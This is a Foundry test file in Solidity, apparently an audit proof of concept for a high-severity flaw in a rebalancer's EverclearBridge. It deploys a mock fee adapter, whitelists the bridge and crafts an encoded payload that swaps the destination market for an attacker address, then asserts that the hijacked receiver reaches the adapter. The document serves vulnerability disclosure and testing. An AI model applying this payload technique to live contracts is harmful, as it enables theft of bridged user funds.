// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

import {Test} from "forge-std/Test.sol";
import {Rebalancer_Unit_Shared} from "../test/unit/shared/Rebalancer_Unit_Shared.t.sol";
import {EverclearBridge} from "../src/rebalancer/bridges/EverclearBridge.sol";
import {IFeeAdapter} from "../src/interfaces/external/everclear/IFeeAdapter.sol";
import {IRebalancer} from "../src/interfaces/IRebalancer.sol";

contract MockFeeAdapter is IFeeAdapter {
    bytes32 public lastReceiver;

    function newIntent(
        uint32[] memory _destinations,
        bytes32 _receiver,
        address _inputAsset,
        bytes32 _outputAsset,
        uint256 _amount,
        uint24 _maxFee,
        uint48 _ttl,
        bytes calldata _data,
        FeeParams calldata _feeParams
    ) external payable returns (bytes32 _intentId, Intent memory _intent) {
        lastReceiver = _receiver;
        return (bytes32(0), _intent);
    }
}

/// @title H-1: EverclearBridge Receiver Manipulation
/// @notice The EverclearBridge implementation blindly passes the 'receiver' address from the arbitrary user payload directly to the Everclear FeeAdapter. Because the payload is unvalidated, an attacker can substitute the destination market address with their own address, effectively stealing the bridged funds upon arrival.
/// @author 0xSchutze
contract Malda_H01_UncheckedData is Test, Rebalancer_Unit_Shared {
    EverclearBridge public everclearBridge;
    MockFeeAdapter public feeAdapter;
    IRebalancer.Msg public exploitMessage;

    function setUpExploitEnvironment() internal {
        // 1. Deploy malicious components and bridge
        feeAdapter = new MockFeeAdapter();
        everclearBridge = new EverclearBridge(address(roles), address(feeAdapter));

        // 2. Grant roles to simulate valid Rebalancer EOA
        roles.allowFor(alice, roles.REBALANCER_EOA(), true);
        roles.allowFor(address(this), roles.GUARDIAN_BRIDGE(), true);

        // 3. Whitelist the bridge and destination
        rebalancer.setWhitelistedBridgeStatus(address(everclearBridge), true);
        rebalancer.setWhitelistedDestination(1, true);

        // 4. Whitelist the market and inject liquidity
        address[] memory allowedMarkets = new address[](1);
        allowedMarkets[0] = address(mWethHost);
        rebalancer.setAllowList(allowedMarkets, true);
        deal(address(weth), address(mWethHost), 1000e18);

        // 5. Construct the malicious payload
        uint32[] memory destinations = new uint32[](1);
        destinations[0] = 1;
        bytes32 maliciousReceiver = bytes32(uint256(uint160(alice)));

        bytes memory payload = abi.encode(
            destinations,
            maliciousReceiver, // Injecting attacker address instead of market address
            address(weth),
            bytes32(uint256(uint160(address(weth)))),
            1000e18,
            0,
            0,
            "",
            IFeeAdapter.FeeParams({fee: 0, deadline: 0, sig: ""})
        );

        // Prepend a dummy 4-byte selector to bypass _decodeIntent slicing
        bytes memory encodedMessage = abi.encodePacked(bytes4(0x7ddd19ca), payload);

        exploitMessage = IRebalancer.Msg({
            dstChainId: 1,
            token: address(weth),
            message: encodedMessage,
            bridgeData: ""
        });
    }

    /// @notice Exploits the unchecked receiver parameter in _decodeIntent to hijack the bridge destination.
    function test_H01_UncheckedData() public {
        // Arrange
        setUpExploitEnvironment();

        // Act
        vm.prank(alice);
        rebalancer.sendMsg(address(everclearBridge), address(mWethHost), 1000e18, exploitMessage);

        // Assert
        // The mock FeeAdapter should have captured the malicious receiver address instead of the destination market.
        assertEq(feeAdapter.lastReceiver(), bytes32(uint256(uint160(alice))));
    }
}